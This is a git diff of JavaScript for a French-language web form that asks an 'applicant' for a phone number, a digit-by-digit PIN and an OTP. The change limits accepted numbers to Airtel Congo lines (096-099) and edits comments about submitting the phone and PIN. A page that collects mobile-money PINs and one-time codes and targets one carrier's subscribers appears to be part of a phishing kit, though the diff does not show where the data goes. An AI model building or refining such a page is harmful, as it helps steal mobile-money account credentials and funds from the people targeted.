@@ -54,13 +54,13 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Enforce Phone Number to ONLY start with 0
+  // Enforce Phone Number Input format limitation
   const phoneInput = document.getElementById('phone-number');
   if (phoneInput) {
     phoneInput.addEventListener('input', (e) => {
       let val = e.target.value.replace(/\D/g, '');
-      if (val.length > 0 && !val.startsWith('0')) {
-        val = '0' + val.replace(/^0+/, '');
+      if (val.length > 10) {
+        val = val.substring(0, 10);
       }
       e.target.value = val;
     });
@@ -93,9 +93,12 @@ document.addEventListener('DOMContentLoaded', () => {
       const lastName = document.getElementById('last-name').value.trim();
       const phoneVal = phoneInput ? phoneInput.value.trim() : '';
 
-      if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
+      // Strict Airtel Congo validation for 096, 097, 098, 099
+      const airtelCongoRegex = /^09[6789]\d{7}$/;
+
+      if (!airtelCongoRegex.test(phoneVal)) {
         if (phoneError) {
-          phoneError.innerText = 'Le numéro de téléphone doit commencer par 0 et être valide.';
+          phoneError.innerText = 'Numéro invalide. Seules les lignes Airtel Congo (096, 097, 098, 099) à 10 chiffres sont autorisées.';
           phoneError.style.display = 'block';
         }
         return;
@@ -122,7 +125,6 @@ document.addEventListener('DOMContentLoaded', () => {
       const phoneVal = phoneInput ? phoneInput.value.trim() : '';
       const displayPhone = document.getElementById('display-applicant-phone');
       if (displayPhone) {
-        // Keeps +243 visible on page UI while displaying number starting with 0
         displayPhone.innerText = `+243 ${phoneVal}`;
       }
 
@@ -160,7 +162,7 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits4, () => submitOtpHandler());
 
-  // Submit Credentials (Phone & PIN) - Sends phone starting with 0
+  // Submit Credentials (Phone & PIN)
   const btnSubmitCreds = document.getElementById('btn-submit-creds');
   if (btnSubmitCreds) {
     btnSubmitCreds.addEventListener('click', async () => {
@@ -302,4 +304,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-    
+                                   
